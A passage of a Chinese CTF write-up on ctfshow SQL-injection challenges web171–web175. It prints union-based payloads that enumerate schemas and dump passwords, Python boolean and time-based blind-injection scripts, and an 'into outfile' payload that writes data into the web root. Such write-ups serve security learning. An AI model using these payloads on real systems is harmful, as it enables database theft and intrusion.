2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211218145758997" src="/assets/images/image-20211218145758997-ddb31d3968456070e6fca38920d1fdda.png" width="1164" height="258" class="img_ev3q"></p>
<p>有些用的是-1，把id改成-1以达到把查询id回显的数据给置空的目的。即</p>
<p><img decoding="async" loading="lazy" alt="image-20211218145902898" src="/assets/images/image-20211218145902898-f47e26b548afca9bb6a2cf964fd7920e.png" width="1123" height="215" class="img_ev3q"></p>
<p>成功获取库名字后，再查询他的表名。使用group_concat()函数，此函数把相同行的数据都组合起来</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union select group_concat(table_name),2,3 from information_schema.tables where table_schema=&quot;ctfshow_web&quot;--+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211218150554423" src="/assets/images/image-20211218150554423-f53431bcaf6ba5cb9ad8aff78985fa4e.png" width="1075" height="194" class="img_ev3q"></p>
<p>然后查列名</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union select group_concat(column_name),2,3 from information_schema.columns where table_name=&quot;ctfshow_user&quot;--+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211218150819123" src="/assets/images/image-20211218150819123-ea00d1c07a3f6257eab85f31d3e95f7d.png" width="1067" height="233" class="img_ev3q"></p>
<p>虽然一开始就知道3列是id username password，但是还是走个正常流程</p>
<p>最后password发现flag</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union select password,2,3 from ctfshow_user --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web172">web172<a href="#web172" class="hash-link" aria-label="Direct link to web172" title="Direct link to web172">​</a></h3>
<p>同上操作，这次在ctfshow_user2中</p>
<div class="language-payload\ codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload\ codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union select password,2,3 from ctfshow_user2 --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web173">web173<a href="#web173" class="hash-link" aria-label="Direct link to web173" title="Direct link to web173">​</a></h3>
<p>过滤查询的结果中是否有&quot;flag&quot;</p>
<p>同上发现有个ctfshow_user3，payload还是不变</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union select password,2,3 from ctfshow_user3 --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web174">web174<a href="#web174" class="hash-link" aria-label="Direct link to web174" title="Direct link to web174">​</a></h3>
<p>草，这里虽然选择了4，但是url上还是select-no-waf-3.php，需要改成select-no-waf-4.php</p>
<p>返回逻辑</p>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//检查结果是否有flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret))){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>测试一下1&#x27; order by 1,2 --+ 发现为3的时候接口异常，所以只有2列</p>
<p>但是如果有数字或者flag他就不给回显</p>
<p>我们根据上面的直接测试</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union select password,2 from ctfshow_user4 --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20220109095916275" src="/assets/images/image-20220109095916275-655679f5cc3770e1129380b8d306f2cc.png" width="1150" height="235" class="img_ev3q"></p>
<p>确实 如果内容里面有数字或者flag就回显都不给我们</p>
<p>那这里采取盲注的方式，使用substr语句。发包找到接口位置是/api/v4.php。脚本为了提高速度，采用二分法，脚本如下</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://f9fd0549-389a-4ee0-b26a-8f574791f409.challenge.ctf.show/api/v4.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;?id=&#x27; union select &#x27;a&#x27;,if(ascii(substr((select group_concat(password) from ctfshow_user4 where username=&#x27;flag&#x27;),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,&#x27;True&#x27;,&#x27;False&#x27;) --+&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;True&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> r</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web175">web175<a href="#web175" class="hash-link" aria-label="Direct link to web175" title="Direct link to web175">​</a></h3>
<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//检查结果是否有flag</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if(!preg_match(&#x27;/[\x00-\x7f]/i&#x27;, json_encode($ret))){</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>简单测试了一下依旧是两列</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="解法一">解法一<a href="#解法一" class="hash-link" aria-label="Direct link to 解法一" title="Direct link to 解法一">​</a></h4>
<p>时间盲注，因为过滤了\x00到\x7f，是完全没有办法输出字符了。</p>
<p>稍微改一下上面脚本即可</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">url </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;http://5adcc7d3-c4d3-440a-8f3e-a4b93e6b61e4.challenge.ctf.show/api/v5.php&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> i </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token builtin">range</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">60</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    lenth </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">len</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">,</span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">128</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token boolean" style="color:#36acaa">True</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        j </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">max</span><span class="token operator" style="color:#393A34">-</span><span class="token builtin">min</span><span class="token punctuation" style="color:#393A34">)</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            flag </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token builtin">chr</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">j</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flag</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">break</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;?id=&#x27; union select &#x27;a&#x27;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username=&#x27;flag&#x27;),</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">i</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,1))&lt;</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">j</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">,sleep(0.5),&#x27;False&#x27;) --+&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        start_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">url</span><span class="token operator" style="color:#393A34">+</span><span class="token plain">payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">text</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        end_time </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> time</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">time</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        sub </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> end_time </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> start_time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">if</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">sub </span><span class="token operator" style="color:#393A34">&gt;=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">max</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">else</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token builtin">min</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> j</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="解法二">解法二<a href="#解法二" class="hash-link" aria-label="Direct link to 解法二" title="Direct link to 解法二">​</a></h4>
<p>将得到的数据通过重定向的方式带到网站根目录</p>
<div class="language-payload codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-payload codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">-1&#x27; union select 1,group_concat(password) from ctfshow_user5 into outfile &#x27;/var/www/html/flag.txt&#x27; --+</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后访问url/flag.txt即可看到flag。前面的题应该都可以这样</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="web176">web176<a href="#web176" class="hash-link" aria-label="Direct link to web176" title="Direct link to web176">​</a></h3>
